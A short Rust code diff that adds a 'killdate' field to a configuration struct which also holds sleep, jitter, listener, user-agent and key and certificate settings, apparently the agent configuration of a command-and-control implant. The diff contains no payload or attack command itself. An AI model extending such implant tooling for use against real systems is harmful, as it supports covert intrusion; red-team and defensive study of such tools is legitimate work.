@@ -6,7 +6,9 @@ pub struct Config {
     pub listener: ListenerConfig,
     pub sleep: u64,
     pub jitter: u64,
-
+    pub killdate: String,
+    
+    // Certificates
     pub server_public_key: PublicKey,
     pub my_secret_key: StaticSecret,
     pub my_public_key: PublicKey,
@@ -21,6 +23,7 @@ impl Config {
         sleep: u64,
         jitter: u64,
         user_agent: String,
+        killdate: String,
         https_root_cert: String,
         https_client_cert: String,
         https_client_key: String,
@@ -41,6 +44,7 @@ impl Config {
             ),
             sleep,
             jitter,
+            killdate,
             server_public_key,
             my_secret_key,
             my_public_key,
